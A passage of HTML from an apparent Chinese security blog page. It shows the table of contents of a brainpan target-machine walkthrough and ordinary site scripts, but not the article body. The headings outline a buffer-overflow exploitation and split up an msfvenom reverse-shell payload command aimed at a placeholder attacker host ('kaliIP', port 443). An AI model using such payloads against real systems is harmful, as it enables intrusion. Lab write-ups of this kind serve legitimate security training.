href="#web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.2.</span> <span class="toc-text">web 渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.1.</span> <span class="toc-text">目录爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wfuzz"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">wfuzz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gobuster"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">gobuster</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10000-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.2.</span> <span class="toc-text">10000 端口</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bin-%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">&#x2F;bin 目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%AF%A6%E7%BB%86%E8%B0%83%E6%9F%A5"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">对可执行文件进行详细调查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#file"><span class="toc-number">2.2.2.2.1.</span> <span class="toc-text">file</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#binwalk"><span class="toc-number">2.2.2.2.2.</span> <span class="toc-text">binwalk</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#strings"><span class="toc-number">2.2.2.2.3.</span> <span class="toc-text">strings</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9999-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.3.</span> <span class="toc-text">9999 端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F-brainpan-exe-%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.</span> <span class="toc-text">对可执行程序 brainpan.exe 进行操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E9%80%BB%E8%BE%91%EF%BC%88%E4%BB%A5%E4%BD%A0%E7%9A%84%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%BE%8B%EF%BC%89%EF%BC%9A"><span class="toc-number">2.3.1.</span> <span class="toc-text">核心逻辑（以你的场景举例）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%9E%9C%EF%BC%9A"><span class="toc-number">2.3.2.</span> <span class="toc-text">后果：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A1%AE%E5%AE%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">2.3.3.</span> <span class="toc-text">1. 确定缓冲区长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%A6%86%E7%9B%96-%E2%80%9C%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E2%80%9D"><span class="toc-number">2.3.4.</span> <span class="toc-text">2. 覆盖 “返回地址”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E8%BE%93%E5%85%A5"><span class="toc-number">2.3.5.</span> <span class="toc-text">3. 构造恶意输入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.6.</span> <span class="toc-text">4. 执行攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AF%86%E5%88%AB"><span class="toc-number">2.4.</span> <span class="toc-text">缓冲区漏洞的识别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">2.4.1.</span> <span class="toc-text">代码解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%9B%AE%E7%9A%84%EF%BC%9A"><span class="toc-number">2.4.2.</span> <span class="toc-text">核心目的：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Immunity-Debug"><span class="toc-number">2.5.</span> <span class="toc-text">Immunity Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-number">2.5.1.</span> <span class="toc-text">关键特点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#esp-%E6%89%A9%E5%AE%B9"><span class="toc-number">2.6.</span> <span class="toc-text">esp 扩容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%89%B9%E7%82%B9%EF%BC%9A-1"><span class="toc-number">2.6.1.</span> <span class="toc-text">关键特点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%89%B9%E7%82%B9%EF%BC%9A-2"><span class="toc-number">2.6.2.</span> <span class="toc-text">关键特点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB"><span class="toc-number">2.7.</span> <span class="toc-text">坏字符识别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%9D%8F%E5%AD%97%E7%AC%A6%EF%BC%9F"><span class="toc-number">2.7.1.</span> <span class="toc-text">一、什么是坏字符？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%80%8E%E4%B9%88%E8%AF%86%E5%88%AB%E5%9D%8F%E5%AD%97%E7%AC%A6%EF%BC%9F"><span class="toc-number">2.7.2.</span> <span class="toc-text">二、怎么识别坏字符？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6%E5%BA%8F%E5%88%97"><span class="toc-number">2.7.2.1.</span> <span class="toc-text">1. 构造字符序列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%91%E9%80%81%E5%BA%8F%E5%88%97%E5%B9%B6%E8%B0%83%E8%AF%95"><span class="toc-number">2.7.2.2.</span> <span class="toc-text">2. 发送序列并调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%80%90%E4%B8%AA%E6%8E%92%E9%99%A4"><span class="toc-number">2.7.2.3.</span> <span class="toc-text">3. 逐个排除</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E"><span class="toc-number">2.7.3.</span> <span class="toc-text">举例说明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jmp-esp-%E5%AE%9A%E4%BD%8D"><span class="toc-number">2.8.</span> <span class="toc-text">jmp esp 定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-payload-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">2.9.</span> <span class="toc-text">构造 payload 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%91%BD%E4%BB%A4%E5%90%84%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90"><span class="toc-number">2.9.1.</span> <span class="toc-text">一、命令各部分解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sudo"><span class="toc-number">2.9.1.1.</span> <span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-msfvenom"><span class="toc-number">2.9.1.2.</span> <span class="toc-text">2. msfvenom</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-p-windows-shell-reverse-tcp"><span class="toc-number">2.9.1.3.</span> <span class="toc-text">3. -p windows&#x2F;shell_reverse_tcp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-LHOST-kaliIP-LPORT-443"><span class="toc-number">2.9.1.4.</span> <span class="toc-text">4. LHOST&#x3D;kaliIP LPORT&#x3D;443</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-b-x00"><span class="toc-number">2.9.1.5.</span> <span class="toc-text">5. -b &quot;\x00&quot;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-e-x86-shikata-ga-nai"><span class="toc-number">2.9.1.6.</span> <span class="toc-text">6. -e x86&#x2F;shikata_ga_nai</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-f-c"><span class="toc-number">2.9.1.7.</span> <span class="toc-text">7. -f c</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E6%88%90%E5%8A%9F"><span class="toc-number">2.9.2.</span> <span class="toc-text">本地测试成功</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.10.</span> <span class="toc-text">成功利用缓冲区漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.11.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F"><span class="toc-number">2.12.</span> <span class="toc-text">提权成功</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.13.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE-1"><span class="toc-number">2.13.1.</span> <span class="toc-text">思维导图</span></a></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/03/20/靶机精炼-思路为王（四）/">靶机精炼-思路为王（四）</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/03/20/靶机精炼-思路为王（二）/">靶机精炼-思路为王（二）</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧\\x7e","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/03/20/靶机精炼-思路为王（三）/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello，欢迎你们来到博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">...</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
